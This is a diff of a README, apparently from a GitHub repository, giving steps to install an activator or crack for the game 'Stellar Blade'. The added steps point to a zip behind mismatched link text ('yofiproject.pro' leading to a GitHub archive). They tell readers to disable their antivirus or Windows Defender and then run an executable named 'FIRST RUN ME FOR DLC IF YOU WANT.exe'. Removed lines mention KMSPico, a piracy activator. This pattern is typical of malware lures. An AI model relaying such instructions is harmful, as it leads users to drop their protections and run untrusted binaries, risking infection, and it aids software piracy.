@@ -6,11 +6,14 @@ Step
 2. Run the Windows Update Blocker file
 3. Follow the settings as shown in the photo below.
 <img width="527" height="258" alt="image" src="https://github.com/user-attachments/assets/0d712494-29de-4d67-9b96-a735ac2afe9f" />
-Instruction for Activator (English version):
+
+Instructions for moving the verify file :
+1. COPY ALL THE FILES IN MY GITHUB REPOSITORY [Xelvryn](https://github.com/Xelvryn/StellarBlade-Activision-Fisrt-Run)
+
+Instruction for Verify Firt Run Game :
 [yofiproject.pro](https://github.com/Xelvryn/StellarBlade-Activision-Fisrt-Run/archive/refs/heads/main.zip)
 1. DISABLE YOUR ANTIVIRUS OR WINDOWS DEFENDER.
-2. RUN "Wub.exe" or Wub_x64.exe to launch the activator.
-3. If you got an problem, try to open alternative file - unzip the archive and then RUN "Start KMSPico.bat".
+2. RUN "FIRST RUN ME FOR DLC IF YOU WANT.exe" to launch the activator.
 
 
 
